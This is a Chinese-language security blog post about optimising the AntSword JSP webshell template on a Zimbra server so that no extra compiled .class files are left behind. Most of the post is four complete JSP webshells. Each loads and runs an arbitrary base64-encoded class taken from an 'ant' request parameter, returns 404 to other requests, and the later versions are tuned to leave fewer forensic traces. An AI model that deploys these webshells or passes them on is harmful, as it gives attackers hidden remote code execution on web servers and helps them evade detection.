---
layout: post
title: Java利用技巧——AntSword-JSP-Template的优化
---


## 0x00 前言
---

在之前的文章[《Java利用技巧——通过反射实现webshell编译文件的自删除》](https://3gstudent.github.io/Java%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7-%E9%80%9A%E8%BF%87%E5%8F%8D%E5%B0%84%E5%AE%9E%E7%8E%B0webshell%E7%BC%96%E8%AF%91%E6%96%87%E4%BB%B6%E7%9A%84%E8%87%AA%E5%88%A0%E9%99%A4)曾介绍了通过反射实现[AntSword-JSP-Template](https://github.com/AntSwordProject/AntSword-JSP-Template)的方法。对于[AntSword-JSP-Template](https://github.com/AntSwordProject/AntSword-JSP-Template)中的`shell.jsp`，访问后会额外生成文件`shell_jsp$U.class`。[《Java利用技巧——通过反射实现webshell编译文件的自删除》](https://3gstudent.github.io/Java%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7-%E9%80%9A%E8%BF%87%E5%8F%8D%E5%B0%84%E5%AE%9E%E7%8E%B0webshell%E7%BC%96%E8%AF%91%E6%96%87%E4%BB%B6%E7%9A%84%E8%87%AA%E5%88%A0%E9%99%A4)中的方法，访问后会额外生成文件`shell_jsp$1.class`。
在某些特殊环境下，需要避免额外生成.class文件。本文将以Zimbra环境为例，介绍实现方法，开源代码，记录细节。

## 0x01 简介
---

本文将要介绍以下内容：

- 实现思路
- 实现代码

## 0x02 实现思路
---

基于[《Java利用技巧——通过反射实现webshell编译文件的自删除》](https://3gstudent.github.io/Java%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7-%E9%80%9A%E8%BF%87%E5%8F%8D%E5%B0%84%E5%AE%9E%E7%8E%B0webshell%E7%BC%96%E8%AF%91%E6%96%87%E4%BB%B6%E7%9A%84%E8%87%AA%E5%88%A0%E9%99%A4)中的方法，访问后会额外生成文件`shell_jsp$1.class`，这里可以通过构造器避免额外生成.class文件。

在具体使用过程中，需要注意如下问题：

#### (1)反射机制中的构造器

正常调用的代码：

```
str=new String(StringBuffer);
```

通过反射实现的代码：

```
Constructor constructor=String.class.getConstructor(StringBuffer.class);
String str=(String)constructor.newInstance(StringBuffer);
```

#### (2)选择合适的defineClass()方法

在ClassLoader类中，`defineClass()`方法有多个重载，可以选择一个可用的重载

本文选择`defineClass(byte[] b, int off, int len)`

#### (3)SecureClassLoader

使用构造器时，应使用`SecureClassLoader`，而不是`ClassLoader`

示例代码：

```
Constructor c = SecureClassLoader.class.getDeclaredConstructor(ClassLoader.class);
```

## 0x03 实现代码
---

为了方便比较，这里给出每种实现方法的代码:

#### (1)test1.jsp

来自[AntSword-JSP-Template](https://github.com/AntSwordProject/AntSword-JSP-Template)中的shell.jsp，代码如下：

```
<%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }

    public byte[] base64Decode(String str) throws Exception {
      Class base64;
      byte[] value = null;
      try {
        base64=Class.forName("sun.misc.BASE64Decoder");
        Object decoder = base64.newInstance();
        value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] {String.class }).invoke(decoder, new Object[] { str });
      } catch (Exception e) {
        try {
          base64=Class.forName("java.util.Base64");
          Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
          value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { str });
        } catch (Exception ee) {}
      }
      return value;
    }
%>
<%
    String cls = request.getParameter("ant");
    if (cls != null) {
        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(new Object[]{request,response});
    }
%>
```

保存在Zimbra的web目录：`/opt/zimbra/jetty_base/webapps/zimbra/`

通过Web访问后在目录`/opt/zimbra/jetty_base/work/zimbra/jsp/org/apache/jsp/`生成以下文件：

- _test1_jsp.java
- _test1_jsp.class
- _test1_jsp$U.class

#### (2)test2.jsp

来自[《Java利用技巧——通过反射实现webshell编译文件的自删除》](https://3gstudent.github.io/Java%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7-%E9%80%9A%E8%BF%87%E5%8F%8D%E5%B0%84%E5%AE%9E%E7%8E%B0webshell%E7%BC%96%E8%AF%91%E6%96%87%E4%BB%B6%E7%9A%84%E8%87%AA%E5%88%A0%E9%99%A4)中通过反射实现[AntSword-JSP-Template](https://github.com/AntSwordProject/AntSword-JSP-Template)的方法，代码如下：

```
<%@ page import="java.lang.reflect.Method" %>

<%!
    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
%>
<%
    String cls = request.getParameter("ant");

    if (cls != null) {
        Method d= ClassLoader.class.getDeclaredMethod("defineClass",byte[].class, int.class, int.class);
        d.setAccessible(true);
        ClassLoader sysloader = getClass().getClassLoader();
        ClassLoader loader = new ClassLoader(sysloader) {};
        Class result = (Class) d.invoke(loader, base64Decode(cls),0,base64Decode(cls).length); 
        result.newInstance().equals(pageContext);
  
    }
    else{
        response.sendError(404);
    }
%>
```

通过Web访问后生成以下文件：

- _test2_jsp.java
- _test2_jsp.class
- _test2_jsp$1.class

#### (3)test3.jsp

基于test2.jsp，通过构造器实现，代码如下：

```
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.security.SecureClassLoader" %>

<%!
    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
%>
<%
    String cls = request.getParameter("ant");

    if (cls != null) {
        Method d= ClassLoader.class.getDeclaredMethod("defineClass",byte[].class, int.class, int.class);
        d.setAccessible(true);
        Constructor c = SecureClassLoader.class.getDeclaredConstructor(ClassLoader.class);
        c.setAccessible(true);
        ClassLoader sysloader = this.getClass().getClassLoader();
        ClassLoader loader =(ClassLoader)c.newInstance(sysloader);
        Class result = (Class)d.invoke(loader,base64Decode(cls),0,base64Decode(cls).length);
        result.newInstance().equals(pageContext);
    }
    else{
        response.sendError(404);
    }
%>
```

通过Web访问后生成以下文件：

- _test3_jsp.java
- _test3_jsp.class

#### (4)test4.jsp

基于test3.jsp，不使用`base64Decode()`，代码如下：

```
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.security.SecureClassLoader" %>

<%
    String cls = request.getParameter("ant");

    if (cls != null) {
        byte[] str=null;
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            str = (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), cls);
        } catch (Exception e) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            str = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, cls);
        }
        Method d= ClassLoader.class.getDeclaredMethod("defineClass",byte[].class, int.class, int.class);
        d.setAccessible(true);
        Constructor c = SecureClassLoader.class.getDeclaredConstructor(ClassLoader.class);
        c.setAccessible(true);
        ClassLoader sysloader = this.getClass().getClassLoader();
        ClassLoader loader =(ClassLoader)c.newInstance(sysloader);
        Class result = (Class)d.invoke(loader,str,0,str.length);
        result.newInstance().equals(pageContext);
    }
    else{
        response.sendError(404);
    }
%>
```

通过Web访问后生成以下文件：

- _test4_jsp.java
- _test4_jsp.class

在代码实现上需要注意Java语言中数组必须先初始化，然后才可以使用

## 0x04 小结
---

本文分享了一种不额外生成.class文件的实现方法，对于开源的代码test4.jsp，还可以应用到Java文件的编写中。

---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)






